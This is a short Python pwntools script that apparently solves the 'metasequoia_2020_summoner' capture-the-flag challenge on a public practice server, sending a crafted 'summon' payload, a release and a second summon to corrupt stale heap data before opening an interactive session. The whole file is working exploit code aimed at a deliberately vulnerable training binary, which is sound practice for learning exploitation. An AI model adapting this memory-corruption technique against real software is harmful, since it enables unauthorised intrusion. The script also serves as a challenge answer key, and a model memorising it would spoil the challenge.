from pwn import *

#p = process('./metasequoia_2020_summoner')
p = remote('node4.buuoj.cn', 29039)
#libc = ELF('libc-2.23.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def summon(s):
    sla(b'Enter your command:', b'summon ' + s)

def release():
    sla(b'Enter your command:', b'release')

def cat():
    sla(b'Enter your command:', b'strike')


summon(b'a' * 8 + b'\x05')
release()
summon(b'a')
cat()

p.interactive()